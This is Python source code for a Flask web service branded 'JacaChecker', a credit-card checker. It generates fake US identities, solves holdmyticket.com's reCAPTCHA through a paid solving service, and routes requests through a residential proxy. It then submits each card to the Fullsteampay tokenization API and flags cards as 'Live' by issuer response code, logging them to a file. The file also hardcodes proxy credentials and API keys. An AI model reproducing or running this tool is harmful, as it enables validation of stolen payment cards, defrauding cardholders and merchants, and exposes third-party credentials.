import csv
import json
from flask import Flask, request, render_template, jsonify
from flask_cors import CORS
import os
import http.client
import threading, requests, random, time, random, re
from urllib3 import disable_warnings
from colorama import Fore


disable_warnings()

    
app = Flask(__name__)

CORS(app)
    
def pegarItem(data, esquerda, direita):
    return data.partition(esquerda)[-1].partition(direita)[0]

# def criarTask():
#     data = {
#         "clientKey": "86f80f989d5d3d9f84ed15a70dcd8a39",
#         "task": {
#             "type": "RecaptchaV2EnterpriseTask",
#             "websiteURL": "https://holdmyticket.com/api/shop/processors/logme2342311",
#             "websiteKey": "6Lf7DLEZAAAAACWoTmGDsOAzTTwXshPMYKQMcrxK",
#         },
#     }
#     criar = requests.post(
#         "https://api.capmonster.cloud/createTask", verify=False, json=data
#     )
#     taskId = criar.json()["taskId"]
#     while True:
#         data = {"clientKey": "86f80f989d5d3d9f84ed15a70dcd8a39", "taskId": taskId}
#         resultado = requests.post(
#             "https://api.capmonster.cloud/getTaskResult", verify=False, json=data
#         )
#         #print(resultado.text)
#         if '"status":"ready"' in resultado.text:
#             return resultado.json()["solution"]["gRecaptchaResponse"]
#         time.sleep(1)

def api_bin(bin):
    try:
        req = requests.get(
            f"https://parrotv2.prod.pagosapi.com/cards?bin={bin}",
            headers={"x-api-key": "fe8d6db2967a4e77b4d7268448897c95"},
            verify=False,
        )
        if req.status_code == 200:
            try:
                tipo = req.json()["card"]["type"]
                nivel = req.json()["card"]["product"]["product_name"]
                banco = req.json()["card"]["bank"]["name"]
                try:
                    pais = req.json()["card"]["country"]["name"]
                except:
                    pais = "N/A"
                return f"{nivel} {tipo} {banco} {pais}".upper()
            except:
                return "SEM INFORMAÇÃO DA BIN"
        else:
            return "SEM INFORMAÇÃO DA BIN"
    except:
        return "SEM INFORMAÇÃO DA BIN"
    

class RequisicaoException(Exception):
    def __init__(self):
        super().__init__()


def reteste(card, month, year, cvv):
        checker(card, month, year, cvv)



def definir_tipo_cartao(card):
    if card.startswith("4"):
        return "VISA"
    elif card.startswith(("51", "52", "53", "54", "55")):
        return "MASTER"
    elif card.startswith(("34", "37")):
        return "American Express"
    elif card.startswith("6"):
        return "Discover"
    else:
        return "Desconhecido"
    
    
def criarTask():
    data = {
        "clientKey": "86f80f989d5d3d9f84ed15a70dcd8a39",
        "task": {
            "type": "RecaptchaV2EnterpriseTask",
            "websiteURL": "https://holdmyticket.com/api/shop/processors/logme2342311",
            "websiteKey": "6Lf7DLEZAAAAACWoTmGDsOAzTTwXshPMYKQMcrxK",
        },
    }
    criar = requests.post(
        "https://api.capmonster.cloud/createTask", verify=False, json=data
    )
    taskId = criar.json()["taskId"]
    while True:
        data = {"clientKey": "86f80f989d5d3d9f84ed15a70dcd8a39", "taskId": taskId}
        resultado = requests.post(
            "https://api.capmonster.cloud/getTaskResult", verify=False, json=data
        )
        #print(resultado.text)
        if '"status":"ready"' in resultado.text:
            return resultado.json()["solution"]["gRecaptchaResponse"]
        time.sleep(1)
    
    
    
def checker(card, month, year, cvv):
        
        
        
        try:
            
        

            p = {'https': 'http://brd-customer-hl_b12cf4ef-zone-privado:6f2jb118cxl2@brd.superproxy.io:22225', 'http':'http://brd-customer-hl_b12cf4ef-zone-privado:6f2jb118cxl2:gh5fkkxopi4c@brd.superproxy.io:22225'}
            url = "https://randomuser.me/api?results=1&gender=&password=upper,lower,12&exc=register,picture,id&nat=US"
            headers = {
                    'Host': 'randomuser.me',
                    'sec-ch-ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
                    'accept': 'application/json, text/plain, */*',
                    'sec-ch-ua-mobile': '?0',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
                    'sec-ch-ua-platform': '"Windows"',
                    'origin': 'https://namso-gen.com',
                    'sec-fetch-site': 'cross-site',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-dest': 'empty',
                    'referer': 'https://namso-gen.com/',
                    'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7'
                    }

            response = requests.get( url, headers=headers, verify=False)
            email = pegarItem(response.text, '"email":"','"')
            nome = pegarItem(response.text, '"first":"','"')
            sobrenome = pegarItem(response.text, '"last":"','"')
            street = pegarItem(response.text, '"name":"','"},"city"')
            snumber = pegarItem(response.text, '"street":{"number":',',')
            city = pegarItem(response.text, '"city":"','"')
            state = pegarItem(response.text, '"state":"','"')
            postcode = pegarItem(response.text, '"postcode":',',')
            company = pegarItem(response.text, '"username":"','"')
            tel = random.randint(00000,99999)
            
            if response.status_code == 200:
          
            
            
                p = {'https': 'http://brd-customer-hl_b12cf4ef-zone-privado:6f2jb118cxl2@brd.superproxy.io:22225', 'http':'http://brd-customer-hl_b12cf4ef-zone-privado:6f2jb118cxl2@brd.superproxy.io:22225'}
                start_time = time.time() 
                recap = criarTask()
        
        
        
        
        
                        
                url = f"https://holdmyticket.com/api/shop/processors/get_authentication_key?captcha_token={recap}"

                payload = {}
                headers = {
                'Host': 'holdmyticket.com',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                'Accept': '*/*',
                'Origin': 'https://tickets.holdmyticket.com',
                'Referer': 'https://tickets.holdmyticket.com/',
                #'Cookie': '_fbp=fb.1.1712014315500.1863181539; PHPSESSID=0b5fb7f955ebe8f673edd97fa4fd3a97; _gid=GA1.2.219304938.1712270413; _gat=1; _ga=GA1.1.1072852156.1712014452; _ga_6BRBZCZGJH=GS1.2.1712270413.3.1.1712270597.41.0.0; _ga_4Y1SMXCRK4=GS1.1.1712270413.3.1.1712270612.0.0.0'
                }

                response = requests.request("GET", url, headers=headers, data=payload, verify=False, proxies=p, timeout=40)
                
                auth_key = response.json()['authenticationKey']


                url = "https://api.fullsteampay.net/api/token/card/clearText/create"

                payload = {
                    "clearTextCardData": {
                        "cardNumber": card,
                        "cvv": "",
                        "expirationMonth": month,
                        "expirationYear": year,
                        "billingInformation": {
                            "nameOnAccount": f"{nome} {sobrenome}",
                            "firstName": nome,
                            "lastName": sobrenome,
                            "address1": f"{snumber} {street}",
                            "address2": None,
                            "city": city,
                            "state": state,
                            "zip": postcode,
                            "country": "US",
                            "phone": f"{tel}00092",
                            "email": email
                        }
                    },
                    "cardEntryContext": 5,
                    "performAccountVerification": True
                }
                headers = {
                'Host': 'api.fullsteampay.net',
                'processor-compat-ver': '1',
                'content-type': 'application/json;charset=UTF-8',
                'authenticationkey': auth_key,
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                'accept': '*/*',
                'origin': 'https://tickets.holdmyticket.com',
                'referer': 'https://tickets.holdmyticket.com/',
                'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7'
                }

                response = requests.request("POST", url, headers=headers, json=payload, verify=False, proxies=p, timeout=40)
                elapsed_time = time.time() - start_time
            
                MSegundos = round(elapsed_time, 2)
                
                if 'Retry Transaction' in response.text:
                    code = response.json()['issuerResponseDetails']['issuerResponseCode']
                    bin = api_bin(card[:6])              
                    x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Retry {code} [{MSegundos}] MS"                          
                    open("holdmyticket.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} Retry {code} [{MSegundos}] #JacaChecker\n")
                    print(Fore.GREEN + f"Live: {x} #JacaChecker")     
                    return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"}
                
                elif 'issuerResponseCode":"85"' in response.text:
                    code = response.json()['issuerResponseDetails']['issuerResponseCode']
                    bin = api_bin(card[:6])              
                    x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: AVS {code} [{MSegundos}] MS"                          
                    open("holdmyticket.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} AVS {code} [{MSegundos}] #JacaChecker\n") 
                    print(Fore.GREEN + f"{x} #JacaChecker") 
                    return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"} 
                    
                elif 'issuerResponseCode":"46"' in response.text:
                    code = response.json()['issuerResponseDetails']['issuerResponseCode']
                    bin = api_bin(card[:6])              
                    x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Account Closed {code} [{MSegundos}] MS"                          
                    print(Fore.RED + f"{x} #JacaChecker")  
                    return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}
                    
                        
                elif 'issuerResponseDetails' in response.text:
                    response = response.json()['issuerResponseDetails']['issuerResponseDescription']
                    bin = api_bin(card[:6])
                    x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: {response} [{MSegundos}] MS"     
                    print(Fore.RED + f"{x} #JacaChecker")  
                    return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}                       

                else:
                    
                    print(Fore.RED + 'Consultar Adm !')
                    return {"code": 2, "mensagem": f"Consultar adm #JacaChecker<br>"}     

                    
        except requests.exceptions.ProxyError:
            print(Fore.LIGHTWHITE_EX + f"RETESTANDO PROXY: {card}|{month}|{year}|{cvv}")
            reteste(card, month, year, cvv)
            
        except requests.exceptions.ConnectionError:
            print(Fore.LIGHTWHITE_EX + f"RETESTANDO ConnectionError: {card}|{month}|{year}|{cvv}")
            reteste(card, month, year, cvv)
        except requests.exceptions.RequestException:
            print(Fore.LIGHTWHITE_EX + f"RETESTANDO RequestException: {card}|{month}|{year}|{cvv}")
            reteste(card, month, year, cvv)
        except RequisicaoException:
            print(Fore.LIGHTWHITE_EX + f"RETESTANDO Location: {card}|{month}|{year}|{cvv}")
            reteste(card, month, year, cvv)


def processar_cartoes(card,mes,ano,cvv):
    try:
        if len(card) == 16 or len(card) == 15 and mes and ano and cvv:
            retorno = checker(card,mes,ano,cvv)
            return {"code": retorno["code"], "retorno": retorno["mensagem"]}
        else:
            return {"code": "", "retorno": "erro no formulario"}
    except:
        return {"code": "", "retorno": "EXCEPTION ! CONTATE ADM SE PERSISTIR"}
    
    
@app.route('/', methods=['GET'])
def iniciarChk():
    return "@Engenieiro"


@app.route('/chk', methods=['GET'])
def chk():
    args = request.args
    print(args)
    card = args.get('card')
    mes = args.get('mes')
    ano = args.get('ano')
    cvv = args.get('cvv')
    return jsonify(processar_cartoes(card,mes,ano,cvv))



if __name__ == '__main__':
    app.run(host='localhost', port=5000, debug=True)
    
    
    
    

